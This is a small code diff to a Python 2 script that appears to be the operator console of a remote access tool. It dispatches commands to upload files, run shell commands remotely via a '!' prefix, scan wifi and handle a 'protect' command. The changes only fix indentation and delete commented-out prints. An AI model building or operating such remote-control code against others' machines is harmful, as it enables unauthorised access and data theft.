@@ -126,7 +126,7 @@ while True:
                 UploadFILE(inText.split(" ")[1])
                 chunk = RecvData()
             elif inText.startswith("!"):
-		ExecIN(inText.split("!")[1])
+		        ExecIN(inText.split("!")[1])
             elif inText.startswith('s-wifi'):
                 card = raw_input("[*] Enter wifi card name (usualy wlan0): ")
                 SendData("ScanWIFI :" + card)
@@ -155,8 +155,6 @@ while True:
                 break
             elif inText.startswith('protect'):
                     SendData(inText)
-                    #print RecvData()
-                    #print RecvData()
                     inText = RecvData()
                     while inText != 'END':
                         print inText
